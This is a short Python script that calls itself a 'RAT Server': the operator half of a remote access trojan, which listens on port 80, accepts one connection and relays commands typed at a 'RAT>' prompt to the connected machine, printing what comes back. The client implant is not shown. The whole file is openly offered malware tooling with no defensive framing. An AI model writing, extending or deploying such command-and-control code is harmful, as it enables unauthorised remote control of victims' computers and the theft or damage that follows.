import socket
import os

port = 80

def clear():
    os.system('cls' if os.name=='nt' else 'clear')

serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
serversocket.bind((host, port))
serversocket.listen(1)

clear()
print("------------RAT Server starting...------------")
clientsocket, addr = serversocket.accept()
print("Connection from: " + str(addr))
while True: 
    msg = input("RAT> ")
    if msg == "help":
        clear()
        print("---------HELP---------")
        print("Test connection: test")

        input("\nPress ENTER to continue")
        clear()
        print("------------RAT Server------------")
        continue

    if msg == "exit" or msg == "close":
        print("Happy hacking!")
        exit()

    else:
        msg = msg.encode("UTF-8")
        clientsocket.send(msg)
        msg = clientsocket.recv(4096)
        print(msg.decode("UTF-8"))
